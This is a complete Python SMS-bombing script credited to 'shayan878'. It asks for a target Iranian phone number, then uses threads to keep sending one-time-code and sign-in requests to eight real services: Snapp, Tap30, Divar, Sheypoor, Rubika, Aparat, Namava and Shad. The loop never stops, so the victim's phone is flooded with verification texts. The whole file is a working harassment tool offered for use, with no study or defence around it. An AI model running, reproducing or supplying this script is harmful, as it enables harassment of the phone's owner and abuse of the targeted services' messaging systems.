import requests
from threading import Thread
from time import sleep
import random
import os

os.system("cls" if os.name == "nt" else "clear")

print("Info:\n    [+] Powered by: shayan878\n")

def send_snapp(phone):
    try:
        requests.post(
            "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            json={"phone": "0" + phone},
            headers={"content-type": "application/json"},
            timeout=5
        )
        print("Snapp sent")
    except:
        print("Snapp failed")

def send_tap30(phone):
    try:
        requests.post(
            "https://tap33.me/api/v2/user",
            json={"credential": {"phoneNumber": "+98" + phone}},
            timeout=5
        )
        print("Tap30 sent")
    except:
        print("Tap30 failed")

def send_divar(phone):
    try:
        requests.post(
            "https://api.divar.ir/v5/auth/authenticate",
            json={"phone": "0" + phone},
            timeout=5
        )
        print("Divar sent")
    except:
        print("Divar failed")

def send_sheypoor(phone):
    try:
        requests.post(
            "https://www.sheypoor.com/api/v10.0.0/auth/send",
            json={"username": "0" + phone},
            timeout=5
        )
        print("Sheypoor sent")
    except:
        print("Sheypoor failed")

def send_rubika(phone):
    try:
        requests.post(
            "https://messengerg2c3.iranlms.ir/",
            json={"api_version":"3","method":"sendCode","data":{"phone_number":"+98"+phone,"send_type":"SMS"}},
            timeout=5
        )
        print("Rubika sent")
    except:
        print("Rubika failed")

def send_aparat(phone):
    try:
        requests.post(
            "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage",
            json={"mobile": "0" + phone},
            timeout=5
        )
        print("Aparat sent")
    except:
        print("Aparat failed")

def send_namava(phone):
    try:
        requests.post(
            "https://www.namava.ir/api/v1.0/accounts/otp",
            json={"UserName": "0" + phone},
            timeout=5
        )
        print("Namava sent")
    except:
        print("Namava failed")

def send_shad(phone):
    try:
        requests.post(
            "https://shadmessenger20.iranlms.ir/",
            json={"method":"sendCode","phone_number":"+98"+phone},
            timeout=5
        )
        print("Shad sent")
    except:
        print("Shad failed")

def attack(phone):
    while True:
        Thread(target=send_snapp, args=(phone,)).start()
        Thread(target=send_tap30, args=(phone,)).start()
        Thread(target=send_divar, args=(phone,)).start()
        Thread(target=send_sheypoor, args=(phone,)).start()
        Thread(target=send_rubika, args=(phone,)).start()
        Thread(target=send_aparat, args=(phone,)).start()
        Thread(target=send_namava, args=(phone,)).start()
        Thread(target=send_shad, args=(phone,)).start()
        sleep(random.uniform(2.0, 3.5))

phone_number = input("Enter target number (example: 9121234567): ")
attack(phone_number)
